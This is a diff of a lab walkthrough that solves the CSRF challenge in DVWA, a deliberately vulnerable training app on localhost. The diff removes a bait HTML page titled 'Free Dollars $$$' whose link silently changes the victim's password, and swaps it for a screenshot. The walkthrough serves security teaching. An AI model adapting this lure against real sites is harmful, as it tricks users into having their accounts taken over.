@@ -35,19 +35,8 @@ So we can use the URL for further attack I will be creating an HTML file that wi
 
 ```HTML file```
 
-```<html>```
+![image](https://github.com/kashrathod19/CSRF-DVWA-SOLUTION/assets/54115061/484e250b-5737-4a8f-afaa-e3f862dc5370)
 
-      ```<title>Free Dollars $$$</title>```
-      
-	  ```<body>```
-   
-	        ```<b><i><u>Click fast to win 100$ </b></i></u>```
-	 
-            ```<a href="http://localhost/dvwa/vulnerabilities/csrf/?password_new=bugbot19&password_conf=bugbot19&Change=Change#">Click here!!!</a>```
-	    
-	  ```</body>```
-   
-```</html>```
 
 ![image](https://github.com/kashrathod19/CSRF-DVWA-SOLUTION/assets/54115061/105b0d7b-19cf-44ed-bc05-96fb3cc614df)
 
